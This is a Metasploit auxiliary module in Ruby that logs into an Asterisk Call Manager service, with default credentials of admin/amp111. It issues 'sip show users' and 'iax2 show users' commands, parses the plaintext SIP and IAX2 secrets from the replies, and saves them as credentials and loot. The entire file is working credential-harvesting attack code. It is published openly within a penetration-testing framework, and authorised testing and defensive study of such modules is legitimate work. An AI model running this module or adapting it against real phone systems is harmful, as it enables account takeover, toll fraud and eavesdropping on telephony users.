##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Asterisk Gather Credentials',
      'Description' => %q{
        This module retrieves SIP and IAX2 user extensions and credentials from
        Asterisk Call Manager service. Valid manager credentials are required.
      },
      'Author'      => 'Brendan Coles <bcoles[at]gmail.com>',
      'References'  =>
        [
          ['URL', 'http://www.asterisk.name/sip1.html'],
          ['URL', 'http://www.asterisk.name/iax2.html'],
          ['URL', 'https://www.voip-info.org/wiki/view/Asterisk+manager+API'],
          ['URL', 'https://www.voip-info.org/wiki-Asterisk+CLI']
        ],
      'License'     => MSF_LICENSE))
    register_options [
      Opt::RPORT(5038),
      OptString.new('USERNAME', [true, 'The username for Asterisk Call Manager', 'admin']),
      OptString.new('PASSWORD', [true, 'The password for the specified username', 'amp111'])
    ]
  end

  def run
    vprint_status 'Connecting...'

    connect
    banner = sock.get_once

    unless banner =~ %r{Asterisk Call Manager/([\d\.]+)}
      fail_with Failure::BadConfig, 'Asterisk Call Manager does not appear to be running'
    end

    print_status "Found Asterisk Call Manager version #{$1}"

    unless login
      fail_with Failure::NoAccess, 'Authentication failed'
    end

    print_good 'Authenticated successfully'

    @users = []
    retrieve_users 'sip'
    retrieve_users 'iax2'

    if @users.empty?
      print_error 'Did not find any users'
      return
    end

    print_status "Found #{@users.length} users"

    cred_table = Rex::Text::Table.new 'Header'  => 'Asterisk User Credentials',
                                      'Indent'  => 1,
                                      'Columns' => ['Username', 'Secret', 'Type']

    @users.each do |user|
      cred_table << [ user['username'],
                      user['password'],
                      user['type'] ]
      report_cred user:     user['username'],
                  password: user['password'],
                  proof:    "#{user['type']} show users"
    end

    print_line
    print_line cred_table.to_s

    p = store_loot 'asterisk.user.creds',
                   'text/csv',
                   rhost,
                   cred_table.to_csv,
                   'Asterisk User Credentials'

    print_good "Credentials saved in: #{p}"
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
    print_error e.message
  ensure
    disconnect
  end

  private

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def report_cred(opts)
    service_data = {
      address:      rhost,
      port:         rport,
      service_name: 'asterisk_manager',
      protocol:     'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type:     :service,
      module_fullname: fullname,
      username:        opts[:user],
      private_data:    opts[:password],
      private_type:    :password
    }.merge service_data

    login_data = {
      core:              create_credential(credential_data),
      status:            Metasploit::Model::Login::Status::UNTRIED,
      proof:             opts[:proof]
    }.merge service_data

    create_credential_login login_data
  end

  def send_command(cmd = '')
    sock.put cmd

    res = ''
    timeout = 15
    Timeout.timeout(timeout) do
      res << sock.get_once while res !~ /\r?\n\r?\n/
    end

    res
  rescue Timeout::Error
    print_error "Timeout (#{timeout} seconds)"
  rescue => e
    print_error e.message
  end

  def login
    vprint_status "Authenticating as '#{username}'"

    req = "action: login\r\n"
    req << "username: #{username}\r\n"
    req << "secret: #{password}\r\n"
    req << "events: off\r\n"
    req << "\r\n"
    res = send_command req

    return false unless res =~ /Response: Success/

    report_cred user:     username,
                password: password,
                proof:    'Response: Success'

    report_service :host  => rhost,
                   :port  => rport,
                   :proto => 'tcp',
                   :name  => 'asterisk'
    true
  end

  def retrieve_users(type)
    vprint_status "Retrieving #{type.upcase} users..."

    req = "action: command\r\n"
    req << "command: #{type} show users\r\n"
    req << "\r\n"
    res = send_command req

    if res =~ /Response: Error/ && res =~ /Message: Permission denied/
      print_error 'Insufficient privileges'
      return
    end

    unless res =~ /Response: Follows/
      print_error 'Unexpected reply'
      return
    end

    # The response is a whitespace formatted table
    # We're only interested in the first two columns: username and secret
    # To parse the table, we need the characer width of these two columns
    if res =~ /^(Username\s+)(Secret\s+)/
      user_len = $1.length
      pass_len = $2.length
    else
      print_error "'#{type} show users' is not supported"
      return
    end

    users = res.scan(/^Username\s+Secret.*?\r?\n(.*)--END COMMAND--/m).flatten.first

    if users.blank?
      print_error "Did not find any #{type.upcase} users"
      return
    else
      print_status "Found #{type.upcase} users"
    end

    users.each_line do |line|
      line.chomp!
      user = line[0...user_len].sub(/\s+$/, '')
      pass = line[user_len...(user_len + pass_len)].sub(/\s+$/, '')
      @users << { 'username' => user, 'password' => pass, 'type' => type }
    end
  end
end
